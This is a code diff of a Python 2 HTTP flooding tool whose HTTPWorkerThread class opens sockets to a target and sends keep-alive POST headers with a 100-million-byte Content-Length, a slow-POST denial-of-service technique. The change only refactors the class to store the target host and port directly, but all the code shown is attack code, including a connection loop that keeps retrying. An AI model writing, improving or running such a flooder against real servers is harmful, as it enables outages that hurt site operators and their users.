@@ -12,7 +12,8 @@ class HTTPWorkerThread(Process):
         self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM, socket.IPPROTO_IP)
         self.socket.setblocking(1)
 
-        self.flooder = flooder
+        self.host = flooder.host
+        self.port = flooder.port
         self.running = True
         self.floodCount = 0
 
@@ -31,7 +32,7 @@ class HTTPWorkerThread(Process):
                           "Connection: keep-alive\r\n"
                           "Keep-Alive: 900\r\n"
                           "Content-Length: 100000000\r\n"
-                          "Content-Type: application/x-www-form-urlencoded\r\n\r\n" % (self.flooder.host))
+                          "Content-Type: application/x-www-form-urlencoded\r\n\r\n" % (self.host))
         print "thread", self.id, "send header"
 
     def run(self):
@@ -39,13 +40,13 @@ class HTTPWorkerThread(Process):
             while self.running:
                 while self.running:
                     try:
-                        self.socket.connect((self.flooder.host, self.flooder.port))
+                        self.socket.connect((self.host, self.port))
                         print "thread", self.id, "connected"
                         break
                     except Exception, e:
                         if e.args[0] == 106 or e.args[0] == 60:
                             break
-                        print "Couldn't connect:", e.args, self.flooder.host, self.flooder.port
+                        print "Couldn't connect:", e.args, self.host, self.port
                         time.sleep(1)
                         continue
                     break
